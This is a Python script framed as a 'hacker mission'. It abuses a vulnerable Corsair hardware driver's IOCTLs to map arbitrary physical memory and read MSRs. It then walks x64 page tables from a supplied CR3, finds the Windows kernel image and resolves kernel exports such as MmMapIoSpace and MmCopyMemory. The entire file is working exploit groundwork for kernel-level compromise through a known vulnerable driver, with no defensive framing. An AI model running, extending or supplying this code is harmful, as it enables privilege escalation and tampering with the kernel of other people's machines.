import ctypes
import struct
import sys

# CAT SHADOW HACKER - KERNEL EXPORT FINDER (PHYSICAL)
# MISSION: LOCATE MmMapIoSpace and MmUnmapIoSpace IN PHYSICAL MEMORY

IOCTL_MAP_PHYS_MEM = 0x00225374
IOCTL_READ_MSR = 0x00225388
IA32_LSTAR = 0xC0000082
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def open_driver():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1: raise Exception("Driver not open")
    return h

def read_msr(h, msr):
    inn = ctypes.c_uint64(msr)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    kernel32.DeviceIoControl(h, IOCTL_READ_MSR, ctypes.byref(inn), 8, ctypes.byref(out), 8, ctypes.byref(ret), None)
    return out.value

def map_page(h, pa):
    inp = struct.pack("<QII", pa & ~0xFFF, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def read_phys(h, pa, size):
    va = map_page(h, pa)
    if not va: return None
    offset = pa & 0xFFF
    return bytes((ctypes.c_ubyte * size).from_address(va + offset))

def kva_to_pa(h, kva, cr3):
    cr3 &= PTE_PHYS_MASK
    idxs = [(kva >> 39) & 0x1FF, (kva >> 30) & 0x1FF, (kva >> 21) & 0x1FF, (kva >> 12) & 0x1FF]
    
    curr_pa = cr3
    for i in range(4):
        entry_pa = curr_pa + (idxs[i] * 8)
        entry_data = read_phys(h, entry_pa, 8)
        if not entry_data: return None
        e = struct.unpack("<Q", entry_data)[0]
        if not (e & 1): return None # Not present
        if i < 3 and (e & 0x80): # Large page
            if i == 1: # 1GB
                return (e & 0xFFFFFC0000000) + (kva & 0x3FFFFFFF)
            if i == 2: # 2MB
                return (e & 0xFFFFFFFE00000) + (kva & 0x1FFFFF)
        curr_pa = e & PTE_PHYS_MASK
    
    return curr_pa + (kva & 0xFFF)

def find_ntoskrnl(h, cr3):
    lstar = read_msr(h, IA32_LSTAR)
    print(f"[*] IA32_LSTAR: 0x{lstar:X}")
    
    # Scan backwards for MZ header
    curr_kva = lstar & ~0xFFF
    for _ in range(5000): # Scan up to 20MB back
        pa = kva_to_pa(h, curr_kva, cr3)
        if pa:
            data = read_phys(h, pa, 2)
            if data == b'MZ':
                print(f"[+] Found ntoskrnl KVA: 0x{curr_kva:X} (PA: 0x{pa:X})")
                return curr_kva, pa
        curr_kva -= PAGE_SIZE
    return None, None

def get_export(h, ntos_pa, ntos_kva, cr3, export_name):
    # This is a bit complex to do purely in physical memory, 
    # but we can do it by reading the PE headers.
    
    # 1. Read PE header offset
    e_lfanew_data = read_phys(h, ntos_pa + 0x3C, 4)
    e_lfanew = struct.unpack("<I", e_lfanew_data)[0]
    
    # 2. Read Export Directory RVA
    # Export Directory is at DataDirectory[0]
    # PE Header + 4 (Sign) + 20 (FileHeader) + 96 (OptionalHeader start to DataDirectory)
    export_dir_rva_pa = ntos_pa + e_lfanew + 4 + 20 + 96
    export_dir_rva_data = read_phys(h, export_dir_rva_pa, 4)
    export_dir_rva = struct.unpack("<I", export_dir_rva_data)[0]
    
    if export_dir_rva == 0: return None
    
    # 3. Read Export Directory
    export_dir_pa = kva_to_pa(h, ntos_kva + export_dir_rva, cr3)
    dir_data = read_phys(h, export_dir_pa, 40)
    
    num_names = struct.unpack("<I", dir_data[24:28])[0]
    names_rva = struct.unpack("<I", dir_data[32:36])[0]
    funcs_rva = struct.unpack("<I", dir_data[28:32])[0]
    ordinals_rva = struct.unpack("<I", dir_data[36:40])[0]
    
    # 4. Search for name
    names_pa = kva_to_pa(h, ntos_kva + names_rva, cr3)
    for i in range(num_names):
        name_rva_data = read_phys(h, names_pa + (i * 4), 4)
        name_rva = struct.unpack("<I", name_rva_data)[0]
        name_pa = kva_to_pa(h, ntos_kva + name_rva, cr3)
        name = b""
        chunk = read_phys(h, name_pa, 64)
        if name_rva == 0 or not chunk: continue
        name = chunk.split(b'\0')[0].decode()
        
        if name == export_name:
            # Found it!
            ordinals_pa = kva_to_pa(h, ntos_kva + ordinals_rva, cr3)
            ordinal_data = read_phys(h, ordinals_pa + (i * 2), 2)
            ordinal = struct.unpack("<H", ordinal_data)[0]
            
            funcs_pa = kva_to_pa(h, ntos_kva + funcs_rva, cr3)
            func_rva_data = read_phys(h, funcs_pa + (ordinal * 4), 4)
            func_rva = struct.unpack("<I", func_rva_data)[0]
            
            addr = ntos_kva + func_rva
            print(f"[+] Found {export_name}: 0x{addr:X}")
            return addr
            
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python find_kernel_exports.py <CR3>")
        sys.exit(1)
        
    cr3 = int(sys.argv[1], 16)
    h = open_driver()
    
    ntos_kva, ntos_pa = find_ntoskrnl(h, cr3)
    if ntos_kva:
        get_export(h, ntos_pa, ntos_kva, cr3, "MmMapIoSpace")
        get_export(h, ntos_pa, ntos_kva, cr3, "MmUnmapIoSpace")
        get_export(h, ntos_pa, ntos_kva, cr3, "MmCopyMemory")
    
    kernel32.CloseHandle(h)
